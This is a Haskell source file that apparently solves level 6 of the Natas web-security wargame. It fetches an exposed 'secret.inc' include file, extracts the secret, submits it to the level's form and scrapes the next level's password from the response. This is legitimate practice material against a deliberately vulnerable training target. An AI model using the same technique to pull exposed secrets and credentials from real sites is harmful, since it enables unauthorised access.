module Natas.Natas6 where

import           Control.Lens
import qualified Data.ByteString.Lazy.Char8 as C
import           Data.Char                  (isAlpha, isSpace)
import           Data.Maybe                 (catMaybes, listToMaybe)
import qualified Data.Text                  as T
import           Data.Text.Encoding         (decodeUtf8)
import           Network.Wreq
import           Text.HTML.TagSoup

import           Natas.Natas

solution :: Solution
solution = do
  sreq <- accessLevel' 6 (parentUri 6 ++ "/includes/secret.inc") id
  let sbody = (decodeUtf8 . C.toStrict) $ sreq ^. responseBody
      Just secret =
        (listToMaybe .
         reverse . T.words . T.filter (\x -> isAlpha x || isSpace x))
          sbody
  opts <- loginOptions 6
  req <-
    postWith
      opts
      (parentUri 6)
      ["secret" := secret, "submit" := ("Submit" :: C.ByteString)]
  let body = (decodeUtf8 . C.toStrict) $ req ^. responseBody
      match =
        (filter ("natas7" `elem`) .
         fmap T.words . catMaybes . fmap maybeTagText . parseTags)
          body
  pure $ listToMaybe match >>= (listToMaybe . reverse)
